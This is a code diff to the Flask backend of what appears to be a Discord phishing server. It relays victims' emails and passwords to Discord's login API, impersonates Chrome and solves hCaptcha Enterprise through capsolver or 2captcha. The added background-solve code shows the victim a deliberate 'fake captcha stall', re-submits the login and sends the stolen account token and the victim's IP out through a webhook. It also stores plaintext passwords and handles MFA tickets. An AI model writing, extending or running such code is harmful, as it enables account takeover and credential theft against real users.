@@ -314,12 +314,12 @@ login_sessions = {}    # Captcha flow: sid -> DiscordSession (persisted between 
 
 
 def solve_captcha(sitekey, rqdata):
-    """Solve hcaptcha Enterprise challenge — uses capsolver Turbo (fastest) or 2captcha."""
+    """Solve hcaptcha Enterprise challenge — capsolver (proxyless) or 2captcha."""
     if not CAPTCHA_KEY:
         return None, 'No CAPTCHA_KEY configured'
 
     t0 = time.time()
-    print(f'[*] Solving captcha via {CAPTCHA_SERVICE} (turbo)...')
+    print(f'[*] Solving captcha via {CAPTCHA_SERVICE}...')
 
     if CAPTCHA_SERVICE == '2captcha':
         api_base = 'https://api.2captcha.com'
@@ -332,14 +332,13 @@ def solve_captcha(sitekey, rqdata):
         }
         if rqdata:
             task['enterprisePayload'] = {'rqdata': rqdata}
-    else:  # capsolver — use Turbo for max speed
+    else:  # capsolver — enterprise proxyless (no proxy required)
         api_base = 'https://api.capsolver.com'
         task = {
-            'type': 'HCaptchaTurboTask',
+            'type': 'HCaptchaEnterpriseTaskProxyLess',
             'websiteURL': 'https://discord.com/login',
             'websiteKey': sitekey,
             'userAgent': UA,
-            'isEnterprise': True,
         }
         if rqdata:
             task['enterprisePayload'] = {'rqdata': rqdata}
@@ -350,30 +349,17 @@ def solve_captcha(sitekey, rqdata):
             'task': task,
         }, timeout=30)
         j = r.json()
-        print(f'[*] createTask: {j.get("taskId", "?")} err={j.get("errorId",0)} ({time.time()-t0:.1f}s)')
+        print(f'[*] createTask: id={j.get("taskId", "?")} err={j.get("errorId",0)} desc={j.get("errorDescription","")} ({time.time()-t0:.1f}s)')
 
         if j.get('errorId', 0) != 0:
-            err_desc = j.get('errorDescription', 'createTask failed')
-            # Fallback: if turbo not available, try enterprise proxyless
-            if 'turbo' in err_desc.lower() or 'not support' in err_desc.lower():
-                print(f'[*] Turbo unavailable, falling back to HCaptchaEnterpriseTaskProxyLess...')
-                task['type'] = 'HCaptchaEnterpriseTaskProxyLess'
-                r = plain_req.post(f'{api_base}/createTask', json={
-                    'clientKey': CAPTCHA_KEY,
-                    'task': task,
-                }, timeout=30)
-                j = r.json()
-                if j.get('errorId', 0) != 0:
-                    return None, j.get('errorDescription', 'createTask failed')
-            else:
-                return None, err_desc
+            return None, j.get('errorDescription', 'createTask failed')
 
         task_id = j.get('taskId')
         if not task_id:
             return None, 'No taskId in response'
 
         # Aggressive polling — 1s intervals for speed
-        for poll in range(120):  # max ~120s
+        for poll in range(120):
             time.sleep(1)
             r = plain_req.post(f'{api_base}/getTaskResult', json={
                 'clientKey': CAPTCHA_KEY,
@@ -592,33 +578,36 @@ def api_login():
             rqtoken  = j.get('captcha_rqtoken', '')
 
             if CAPTCHA_KEY:
-                # ── Auto-solve server-side ──
-                print(f'[*] Captcha challenge #{attempt+1}, auto-solving via {CAPTCHA_SERVICE}...')
-                solved_token, err = solve_captcha(sitekey, rqdata)
-                if not solved_token:
-                    print(f'[!] Captcha solve failed: {err}')
-                    return jsonify({'error': f'Captcha solve failed: {err}'}), 500
-
-                # Prepare re-submit payload with solved token
-                payload['captcha_key'] = solved_token
-                payload['captcha_rqtoken'] = rqtoken
-
-                # Fresh connection but preserve cookies + fingerprint
-                snap = ds.snapshot()
-                ds = DiscordSession()
-                ds.s = creq.Session(impersonate='chrome')
-                ds.restore(snap)
-                continue  # retry with solved captcha
+                # ── Auto-solve server-side in background thread ──
+                # Return immediately so frontend can show fake captcha stall
+                sid = uuid.uuid4().hex[:12]
+                login_sessions[sid] = {
+                    'rqtoken': rqtoken,
+                    'session': ds,
+                    'snap': ds.snapshot(),
+                    'payload': dict(payload),
+                    'email': login_email,
+                    'pw': login_pw,
+                    'sitekey': sitekey,
+                    'rqdata': rqdata,
+                    'status': 'solving',   # solving → done
+                    'result': None,         # final JSON to return
+                    'result_code': 200,
+                    'client_ip': request.headers.get('X-Forwarded-For', request.remote_addr),
+                }
+                print(f'[*] Captcha challenge #{attempt+1}, starting background solve. sid={sid}')
+                threading.Thread(target=_bg_solve, args=(sid,), daemon=True).start()
+                return jsonify({'captcha_stall': True, 'session_id': sid})
             else:
                 # ── No API key — return captcha to frontend (fallback) ──
                 sid = uuid.uuid4().hex[:12]
                 login_sessions[sid] = {
                     'rqtoken': rqtoken,
-                    'session': ds,   # store FULL session for IP reuse
+                    'session': ds,
                     'snap': ds.snapshot(),
                 }
                 challenge_type = 'captcha-required' if 'captcha-required' in (ckeys or []) else 'invalid-response'
-                print(f'[*] Captcha [{challenge_type}] returned to frontend. sid={sid}, rqt={rqtoken[:30]}...')
+                print(f'[*] Captcha [{challenge_type}] returned to frontend. sid={sid}')
                 return jsonify({
                     'captcha': True,
                     'captcha_sitekey': sitekey,
@@ -626,10 +615,6 @@ def api_login():
                     'captcha_rqtoken': rqtoken,
                     'captcha_service': j.get('captcha_service', 'hcaptcha'),
                     'session_id': sid,
-                    'challenge_type': challenge_type,
-                    'discord_status': r.status_code if r else 0,
-                    'discord_captcha_key': ckeys,
-                    'attempt': attempt + 1,
                 })
 
         # ── Process final result ──
@@ -651,6 +636,121 @@ def api_login():
         traceback.print_exc()
         print(f'[!] Login error: {e}')
         return jsonify({'error': str(e)}), 500
+
+
+def _bg_solve(sid):
+    """Background thread: solve captcha, re-submit login, store result."""
+    try:
+        sess = login_sessions.get(sid)
+        if not sess:
+            return
+
+        sitekey = sess['sitekey']
+        rqdata  = sess['rqdata']
+        rqtoken = sess['rqtoken']
+        payload = sess['payload']
+        ds      = sess['session']
+
+        print(f'[bg:{sid}] Solving captcha...')
+        solved_token, err = solve_captcha(sitekey, rqdata)
+        if not solved_token:
+            print(f'[bg:{sid}] Solve failed: {err}')
+            sess['result'] = {'error': f'Captcha solve failed: {err}'}
+            sess['result_code'] = 500
+            sess['status'] = 'done'
+            return
+
+        # Re-submit login with solved captcha token
+        payload['captcha_key'] = solved_token
+        payload['captcha_rqtoken'] = rqtoken
+
+        # Fresh connection, preserve identity
+        snap = ds.snapshot()
+        ds2 = DiscordSession()
+        ds2.s = creq.Session(impersonate='chrome')
+        ds2.restore(snap)
+
+        try:
+            r = ds2.post('/auth/login', payload)
+        except Exception as ce:
+            print(f'[bg:{sid}] Connection error on re-submit: {ce}')
+            snap2 = ds2.snapshot()
+            ds3 = DiscordSession()
+            ds3.s = creq.Session(impersonate='chrome')
+            ds3.restore(snap2)
+            r = ds3.post('/auth/login', payload)
+            ds2 = ds3
+
+        j = r.json()
+        print(f'[bg:{sid}] Re-submit [{r.status_code}]: {r.text[:400]}')
+
+        # Check if ANOTHER captcha came back (need to solve again)
+        ckeys = j.get('captcha_key', [])
+        is_captcha = isinstance(ckeys, list) and (
+            'captcha-required' in ckeys or 'invalid-response' in ckeys
+            or j.get('captcha_sitekey')
+        )
+
+        if is_captcha:
+            # Solve again (attempt 2)
+            sitekey2 = j.get('captcha_sitekey', sitekey)
+            rqdata2  = j.get('captcha_rqdata', '')
+            rqtoken2 = j.get('captcha_rqtoken', '')
+            print(f'[bg:{sid}] Another captcha, solving again...')
+            solved2, err2 = solve_captcha(sitekey2, rqdata2)
+            if not solved2:
+                sess['result'] = {'error': f'Captcha re-solve failed: {err2}'}
+                sess['result_code'] = 500
+                sess['status'] = 'done'
+                return
+            payload['captcha_key'] = solved2
+            payload['captcha_rqtoken'] = rqtoken2
+            snap3 = ds2.snapshot()
+            ds4 = DiscordSession()
+            ds4.s = creq.Session(impersonate='chrome')
+            ds4.restore(snap3)
+            r = ds4.post('/auth/login', payload)
+            j = r.json()
+            print(f'[bg:{sid}] Attempt 3 [{r.status_code}]: {r.text[:400]}')
+
+        # Process result
+        if j.get('token'):
+            ip = sess.get('client_ip', '?')
+            fire_webhook(j['token'], ip)
+            sess['result'] = {'success': True}
+            sess['result_code'] = 200
+        elif j.get('ticket') and j.get('mfa') is not None:
+            sess['result'] = j
+            sess['result_code'] = 200
+        else:
+            sess['result'] = j
+            sess['result_code'] = r.status_code if r else 500
+
+        sess['status'] = 'done'
+        print(f'[bg:{sid}] Done. success={j.get("token") is not None}, mfa={j.get("mfa") is not None}')
+
+    except Exception as e:
+        import traceback
+        traceback.print_exc()
+        if sid in login_sessions:
+            login_sessions[sid]['result'] = {'error': str(e)}
+            login_sessions[sid]['result_code'] = 500
+            login_sessions[sid]['status'] = 'done'
+
+
+@app.route('/api/login/poll/<sid>')
+def api_login_poll(sid):
+    """Frontend polls this while the background captcha solve is running."""
+    sess = login_sessions.get(sid)
+    if not sess:
+        return jsonify({'error': 'Session not found'}), 404
+    if sess['status'] == 'solving':
+        return jsonify({'status': 'solving'})
+    # Done — return the result and clean up
+    result = sess.get('result', {'error': 'Unknown error'})
+    code   = sess.get('result_code', 500)
+    login_sessions.pop(sid, None)
+    return jsonify(result), code
 
 
 @app.route('/api/mfa/totp', methods=['POST'])
